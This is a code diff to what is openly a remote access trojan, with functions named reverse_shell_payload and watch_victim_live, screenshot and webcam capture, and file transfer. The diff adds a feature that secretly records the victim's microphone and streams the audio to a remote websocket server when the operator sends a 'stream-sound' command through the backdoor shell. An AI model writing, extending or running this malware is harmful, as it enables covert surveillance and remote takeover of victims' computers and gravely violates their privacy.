@@ -4,6 +4,7 @@ import asyncio
 import websockets
 import random
 import subprocess
+import websocket
 import json
 import geocoder
 import gps  
@@ -13,8 +14,10 @@ from PIL import ImageGrab
 import threading
 from scipy.io.wavfile import write
 import sounddevice as sd
+import sys
 SERVER_URL = "192.168.88.104:2020"
 WEBSOCKET_URL="ws://192.168.88.104:8765"
+WEBSOCKET_AUDIO="ws://192.168.88.104:8766"
 PORT=12345
 IP_ADDRESS="192.168.88.104"
 banner = r"""
@@ -66,6 +69,20 @@ async def open_camera():
             _, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 30])
             await ws.send(buffer.tobytes())
             await asyncio.sleep(0.03)  
+def audio_stream(ws):
+    SAMPLE_RATE = 16000
+    CHANNELS = 1
+    CHUNK_SIZE = 1024
+    def callback(indata, frames, time, status):
+        if status:
+            print(status, file=sys.stderr)
+        ws.send(indata.tobytes(), opcode=websocket.ABNF.OPCODE_BINARY)
+    with sd.InputStream(samplerate=SAMPLE_RATE,
+                        channels=CHANNELS,
+                        dtype='int16',
+                        blocksize=CHUNK_SIZE,
+                        callback=callback):
+        threading.Event().wait() 
 def put_files(args):
     chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
     desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
@@ -107,7 +124,6 @@ def get_files(args):
         return True
     except:
         return False
-
 def get_screenshot():
     try:
         screenshot = ImageGrab.grab()
@@ -210,6 +226,12 @@ def watch_victim_live():
        asyncio.run(open_camera())
     except Exception:
         pass
+def listening_victim_realtime():
+    ws = websocket.WebSocket()
+    ws.connect(WEBSOCKET_AUDIO)
+    audio_thread = threading.Thread(target=audio_stream, args=(ws,), daemon=True)
+    audio_thread.start()
+    return audio_thread
 def reverse_shell_payload():
     s=socket.socket()
     s.connect((IP_ADDRESS,PORT))
@@ -219,6 +241,9 @@ def reverse_shell_payload():
            s.send(b"~shell@backdoor ")
            cmd = s.recv(1024).decode("utf-8").strip()
            if not cmd:
+               continue
+           if cmd.lower() == "stream-sound":
+               thread_audio = listening_victim_realtime()
                continue
            if cmd.startswith("record"):
                cmd = cmd.split(" ")
